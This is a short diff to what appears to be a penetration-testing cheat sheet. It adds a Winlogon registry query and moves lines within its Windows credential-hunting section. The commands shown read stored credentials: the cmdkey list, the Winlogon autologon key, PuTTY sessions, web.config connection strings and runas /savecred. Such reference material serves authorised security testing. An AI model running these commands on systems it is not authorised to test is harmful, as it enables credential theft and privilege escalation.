@@ -4146,8 +4146,9 @@ reg add <REGISTRY_KEY> /v <VALUE_TO_MODIFY> /t REG_EXPAND_SZ /d C:\PATH\TO\FILE\
 ```c
 cmdkey /list
 rundll32 keymgr.dll, KRShowKeyMgr
-type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 reg query HKEY_CURRENT_USER\Software\<USERNAME>\PuTTY\Sessions\ /f "Proxy" /s
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
 ```
 
 ###### Search for Passwords
@@ -4171,6 +4172,12 @@ type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\Conso
 ```c
 cmdkey /list
 runas /savecred /user:<USERNAME> cmd.exe
+```
+
+###### Winlogon Credentials
+
+```c
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 ```
 
 ###### Search the Registry for Passwords
